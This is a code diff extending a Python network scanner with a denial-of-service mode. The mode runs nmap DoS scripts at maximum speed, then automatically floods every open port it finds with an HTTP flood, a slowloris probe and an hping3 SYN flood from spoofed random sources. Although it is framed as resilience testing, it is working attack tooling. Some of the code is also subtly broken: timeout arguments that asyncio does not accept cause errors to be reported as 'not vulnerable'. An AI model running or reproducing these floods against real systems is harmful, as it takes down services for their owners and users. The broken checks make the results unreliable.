@@ -56,7 +56,6 @@ class AdaptiveScanner:
                         # For first retry, try more stealth approach
                         if retry_count == 1:
                             stealth = True
-                            dos = True  # Minimize retries
                             logger.info("Using stealth scan parameters")
                         
                         # For second retry, try different timing and techniques
@@ -78,7 +77,25 @@ class AdaptiveScanner:
                         nmap_args.append('-O')
                     if vuln_scan:
                         nmap_args.append('--script=vuln')
+                    
+                    # DoS-specific options
                     if dos:
+                        # Use DoS-related NSE scripts for testing service resilience
+                        dos_scripts = [
+                            'dos', 
+                            'syn-flood', 
+                            'http-slowloris', 
+                            'http-flood'
+                        ]
+                        nmap_args.append(f'--script={",".join(dos_scripts)}')
+                        # Increase aggressiveness for DoS testing
+                        nmap_args.append('-T5')
+                        # Increase packet rate for stress testing
+                        nmap_args.append('--min-rate=1000')
+                        # Log what we're doing
+                        logger.warning("Running DoS testing scripts against target - USE WITH CAUTION!")
+                    else:
+                        # Standard scan limit retries to reduce network load
                         nmap_args.append('--max-retries=1')
                     
                     # For retries, add decoy IP addresses
@@ -120,6 +137,15 @@ class AdaptiveScanner:
                     # Scan successful, parse results
                     logger.info(f"Scan successful on attempt {retry_count+1}")
                     results = self._parse_nmap_output(stdout.decode())
+                    
+                    # If DoS scanning was requested, perform additional DoS testing
+                    if dos and results.get('hosts'):
+                        logger.warning("Performing additional DoS testing against discovered services...")
+                        dos_results = await self._perform_additional_dos_tests(results)
+                        
+                        # Add DoS test results to the main results
+                        for host in results.get('hosts', []):
+                            host['dos_tests'] = dos_results.get(host.get('ip'), {})
                     
                     # Save results
                     timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
@@ -392,3 +418,219 @@ class AdaptiveScanner:
             })
         
         return results 
+
+    async def _perform_additional_dos_tests(self, scan_results: Dict[str, Any]) -> Dict[str, Any]:
+        """
+        Perform additional DoS testing against discovered services
+        """
+        results = {}
+        
+        for host in scan_results.get('hosts', []):
+            host_ip = host.get('ip')
+            if not host_ip:
+                continue
+                
+            host_results = {}
+            
+            # Test each open port for DoS vulnerabilities
+            for port in host.get('ports', []):
+                port_num = port.get('port')
+                service = port.get('service', '')
+                if not port_num or port.get('state') != 'open':
+                    continue
+                
+                service_results = {}
+                
+                # HTTP-based DoS tests
+                if service.lower() in ['http', 'https'] or port_num in [80, 443, 8080, 8443]:
+                    logger.warning(f"Testing HTTP DoS vulnerabilities on {host_ip}:{port_num}")
+                    
+                    # Perform HTTP Slowloris test
+                    slowloris_result = await self._test_slowloris(host_ip, port_num)
+                    service_results['slowloris'] = slowloris_result
+                    
+                    # Perform HTTP Flood test
+                    http_flood_result = await self._test_http_flood(host_ip, port_num)
+                    service_results['http_flood'] = http_flood_result
+                
+                # TCP SYN flood test for any service
+                logger.warning(f"Testing SYN flood vulnerability on {host_ip}:{port_num}")
+                syn_flood_result = await self._test_syn_flood(host_ip, port_num)
+                service_results['syn_flood'] = syn_flood_result
+                
+                host_results[str(port_num)] = service_results
+            
+            results[host_ip] = host_results
+            
+        return results
+        
+    async def _test_slowloris(self, target: str, port: int) -> Dict[str, Any]:
+        """
+        Test target for HTTP Slowloris vulnerability
+        """
+        try:
+            # Use a limited version for testing purposes - don't actually take down the service
+            # Just check if it's vulnerable
+            cmd = [
+                'nmap',
+                '--script=http-slowloris',
+                '--script-args=http-slowloris.runforever=false,http-slowloris.timeout=10',
+                '-p', str(port),
+                target
+            ]
+            
+            process = await asyncio.create_subprocess_exec(
+                *cmd,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE
+            )
+            
+            stdout, stderr = await process.communicate()
+            output = stdout.decode()
+            
+            # Parse results to determine vulnerability
+            vulnerable = 'VULNERABLE' in output
+            
+            return {
+                "test": "slowloris",
+                "vulnerable": vulnerable,
+                "details": output if vulnerable else "Not vulnerable to Slowloris"
+            }
+            
+        except Exception as e:
+            logger.error(f"Error during Slowloris test: {str(e)}")
+            return {
+                "test": "slowloris",
+                "vulnerable": False,
+                "error": str(e)
+            }
+    
+    async def _test_http_flood(self, target: str, port: int) -> Dict[str, Any]:
+        """
+        Test target for HTTP flood vulnerability
+        """
+        try:
+            # Simulate an HTTP flood with limited requests
+            protocol = 'https' if port == 443 else 'http'
+            cmd = [
+                'ab',  # Apache Benchmark tool
+                '-n', '1000',  # Number of requests
+                '-c', '50',    # Concurrency
+                '-k',          # Keep-alive
+                f'{protocol}://{target}:{port}/'
+            ]
+            
+            try:
+                process = await asyncio.create_subprocess_exec(
+                    *cmd,
+                    stdout=asyncio.subprocess.PIPE,
+                    stderr=asyncio.subprocess.PIPE
+                )
+                
+                stdout, stderr = await process.communicate(timeout=15)  # Limit test time
+                output = stdout.decode()
+                
+                # Analyze response times and errors to determine vulnerability
+                failed_requests = re.search(r'Failed requests:\s+(\d+)', output)
+                if failed_requests and int(failed_requests.group(1)) > 0:
+                    vulnerable = True
+                    details = f"Server failed to handle {failed_requests.group(1)} requests"
+                else:
+                    vulnerable = False
+                    details = "Server handled all test requests"
+                
+                return {
+                    "test": "http_flood",
+                    "vulnerable": vulnerable,
+                    "details": details
+                }
+                
+            except asyncio.TimeoutError:
+                # If the command timed out, the server might be vulnerable
+                return {
+                    "test": "http_flood",
+                    "vulnerable": True,
+                    "details": "Server response time degraded significantly during test"
+                }
+                
+        except Exception as e:
+            logger.error(f"Error during HTTP flood test: {str(e)}")
+            return {
+                "test": "http_flood",
+                "vulnerable": False,
+                "error": str(e)
+            }
+    
+    async def _test_syn_flood(self, target: str, port: int) -> Dict[str, Any]:
+        """
+        Test target for SYN flood vulnerability
+        """
+        try:
+            # Use hping3 for a controlled SYN flood test
+            cmd = [
+                'hping3',
+                '-S',          # SYN flag
+                '-p', str(port),
+                '--flood',      # Flood mode
+                '--rand-source', # Random source IP
+                '-c', '1000',   # Packet count - limited for testing
+                target
+            ]
+            
+            try:
+                process = await asyncio.create_subprocess_exec(
+                    *cmd,
+                    stdout=asyncio.subprocess.PIPE,
+                    stderr=asyncio.subprocess.PIPE
+                )
+                
+                stdout, stderr = await process.communicate(timeout=10)  # Limit test time
+                output = stdout.decode()
+                
+                # After the flood, check if service is still responsive
+                responsive = await self._check_port_responsive(target, port)
+                
+                if responsive:
+                    return {
+                        "test": "syn_flood",
+                        "vulnerable": False,
+                        "details": "Service remained responsive during SYN flood"
+                    }
+                else:
+                    return {
+                        "test": "syn_flood",
+                        "vulnerable": True,
+                        "details": "Service became unresponsive during SYN flood"
+                    }
+                    
+            except asyncio.TimeoutError:
+                # Command timeout could indicate the test was successful in affecting the service
+                responsive = await self._check_port_responsive(target, port)
+                return {
+                    "test": "syn_flood",
+                    "vulnerable": not responsive,
+                    "details": "Test timed out, service responsiveness: " + ("No" if not responsive else "Yes")
+                }
+                
+        except Exception as e:
+            logger.error(f"Error during SYN flood test: {str(e)}")
+            return {
+                "test": "syn_flood",
+                "vulnerable": False,
+                "error": str(e)
+            }
+    
+    async def _check_port_responsive(self, target: str, port: int) -> bool:
+        """
+        Check if a port is responsive after DoS testing
+        """
+        try:
+            # Use a simple socket connection to check responsiveness
+            import socket
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(2)  # Short timeout
+            result = sock.connect_ex((target, port))
+            sock.close()
+            return result == 0
+        except:
+            return False 
